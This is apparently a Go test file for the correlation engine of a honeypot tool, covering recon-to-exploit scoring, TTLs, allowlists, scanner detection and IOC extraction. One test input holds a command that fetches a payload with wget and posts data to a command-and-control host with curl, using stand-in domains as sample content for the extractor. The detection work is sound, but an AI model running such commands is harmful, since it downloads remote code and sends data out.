package correlate

import (
	"testing"
	"time"

	"github.com/enondev/nullpot/specs"
)

func TestEngineRecordAndCorrelate(t *testing.T) {
	e := NewEngine()

	// Record a sweep, then a hit from same IP -> high confidence
	e.RecordSweep("203.0.113.45", time.Now().Add(-2*time.Hour))
	e.RecordHit("203.0.113.45", time.Now())

	result := e.Correlate("203.0.113.45", time.Now())
	if !result.IsHighConfidence {
		t.Fatal("expected high confidence for recon+exploit from same IP")
	}
	if !result.ReconSeen || !result.ExploitSeen {
		t.Fatal("expected both recon and exploit seen")
	}
	if result.RiskMultiplier != 10.0 {
		t.Fatalf("expected 10x risk multiplier, got %f", result.RiskMultiplier)
	}
}

func TestEngineSweepOnlyShortTTL(t *testing.T) {
	e := NewEngine()
	e.RecordSweep("203.0.113.45", time.Now())

	result := e.Correlate("203.0.113.45", time.Now())
	if result.IsHighConfidence {
		t.Fatal("sweep-only should not be high confidence")
	}
	if result.TTL > 24*time.Hour {
		t.Fatalf("sweep-only TTL should be short, got %v", result.TTL)
	}
}

func TestEngineHitOnly(t *testing.T) {
	e := NewEngine()
	e.RecordHit("203.0.113.45", time.Now())

	result := e.Correlate("203.0.113.45", time.Now())
	if result.IsHighConfidence {
		t.Fatal("hit-only should not be high confidence")
	}
	if !result.ExploitSeen {
		t.Fatal("expected exploit seen")
	}
}

func TestEngineNoActivity(t *testing.T) {
	e := NewEngine()
	result := e.Correlate("203.0.113.45", time.Now())
	if result.IsHighConfidence || result.ReconSeen || result.ExploitSeen {
		t.Fatal("no activity should not correlate")
	}
}

func TestEngineHitBeforeSweepNotHighConfidence(t *testing.T) {
	e := NewEngine()
	now := time.Now()
	e.RecordHit("203.0.113.45", now.Add(-2*time.Hour))
	e.RecordSweep("203.0.113.45", now)

	result := e.Correlate("203.0.113.45", now)
	if result.IsHighConfidence {
		t.Fatal("hit before sweep should not be high confidence (no recon->exploit escalation)")
	}
}

func TestEngineSweepOlderThan24h(t *testing.T) {
	e := NewEngine()
	e.RecordSweep("203.0.113.45", time.Now().Add(-30*time.Hour))
	e.RecordHit("203.0.113.45", time.Now())

	result := e.Correlate("203.0.113.45", time.Now())
	if result.IsHighConfidence {
		t.Fatal("sweep older than 24h should not be high confidence")
	}
}

func TestC2Extractor(t *testing.T) {
	x := NewC2Extractor()
	content := `wget http://evil.com/payload.bin && curl https://c2.badactor.net/callback -d "data"
Connecting to 198.51.100.23:4444`
	iocs := x.Extract(content)

	foundURL := false
	foundDomain := false
	foundIP := false
	for _, ioc := range iocs {
		switch {
		case ioc.Type == "url" && ioc.Value == "http://evil.com/payload.bin":
			foundURL = true
		case ioc.Type == "domain" && ioc.Value == "evil.com":
			foundDomain = true
		case ioc.Type == "ip" && ioc.Value == "198.51.100.23":
			foundIP = true
		}
	}
	if !foundURL {
		t.Fatal("expected URL IOC")
	}
	if !foundDomain {
		t.Fatal("expected domain IOC")
	}
	if !foundIP {
		t.Fatal("expected IP IOC")
	}
}

func TestC2ExtractorDedup(t *testing.T) {
	x := NewC2Extractor()
	iocs := x.Extract("http://evil.com/a http://evil.com/b http://evil.com/a")
	seen := make(map[string]bool)
	for _, ioc := range iocs {
		if seen[ioc.Value] {
			t.Fatalf("duplicate IOC: %s", ioc.Value)
		}
		seen[ioc.Value] = true
	}
}

func TestScoreASN(t *testing.T) {
	if ScoreASN("AS12345", true) != 10.0 {
		t.Fatal("confirmed C2 ASN should score 10x")
	}
	if ScoreASN("AS12345", false) != 1.0 {
		t.Fatal("non-C2 ASN should score 1x")
	}
}

func TestAllowlist(t *testing.T) {
	a := NewAllowlist()
	if err := a.AddNetwork("203.0.113.0/24"); err != nil {
		t.Fatalf("add network: %v", err)
	}
	if !a.IsAllowed("203.0.113.45") {
		t.Fatal("expected 203.0.113.45 to be allowed")
	}
	if a.IsAllowed("198.51.100.1") {
		t.Fatal("expected 198.51.100.1 to not be allowed")
	}
}

func TestAllowlistInvalidCIDR(t *testing.T) {
	a := NewAllowlist()
	if err := a.AddNetwork("not-a-cidr"); err == nil {
		t.Fatal("expected error for invalid CIDR")
	}
}

func TestIsResearcher(t *testing.T) {
	if !IsResearcher("scan.shodan.io", "AS12345") {
		t.Fatal("shodan should be researcher")
	}
	if !IsResearcher("censys.io", "") {
		t.Fatal("censys should be researcher")
	}
	if !IsResearcher("googlebot.com", "") {
		t.Fatal("googlebot should be researcher")
	}
	if IsResearcher("evil-attacker.com", "AS99999") {
		t.Fatal("random domain should not be researcher")
	}
}

func TestTTLPolicy(t *testing.T) {
	p := NewTTLPolicy()
	c2TTL := p.TTLFor(true, false)
	if c2TTL < 7*24*time.Hour || c2TTL > 30*24*time.Hour {
		t.Fatalf("C2 TTL should be 7-30d, got %v", c2TTL)
	}

	residentialTTL := p.TTLFor(false, true)
	if residentialTTL < 6*time.Hour || residentialTTL > 24*time.Hour {
		t.Fatalf("residential TTL should be 6-24h, got %v", residentialTTL)
	}

	shortTTL := p.TTLFor(false, false)
	if shortTTL != 6*time.Hour {
		t.Fatalf("default TTL should be 6h, got %v", shortTTL)
	}
}

func TestFingerprintHash(t *testing.T) {
	h1 := FingerprintHash("test")
	h2 := FingerprintHash("test")
	h3 := FingerprintHash("different")
	if h1 != h2 {
		t.Fatal("same input should produce same hash")
	}
	if h1 == h3 {
		t.Fatal("different input should produce different hash")
	}
	if len(h1) != 64 {
		t.Fatalf("SHA-256 hex should be 64 chars, got %d", len(h1))
	}
}

func TestSortIOCs(t *testing.T) {
	iocs := []ExtractedIOC{
		{Type: "ip", Value: "1.2.3.4"},
		{Type: "url", Value: "http://b.com"},
		{Type: "domain", Value: "a.com"},
		{Type: "url", Value: "http://a.com"},
	}
	SortIOCs(iocs)
	if iocs[0].Type != "domain" || iocs[0].Value != "a.com" {
		t.Fatalf("unexpected sort: %+v", iocs)
	}
	if iocs[1].Type != "ip" || iocs[1].Value != "1.2.3.4" {
		t.Fatalf("unexpected sort: %+v", iocs)
	}
	if iocs[2].Type != "url" || iocs[2].Value != "http://a.com" {
		t.Fatalf("unexpected sort: %+v", iocs)
	}
	if iocs[3].Type != "url" || iocs[3].Value != "http://b.com" {
		t.Fatalf("unexpected sort: %+v", iocs)
	}
}

var _ = specs.ClassUIDNetworkActivity
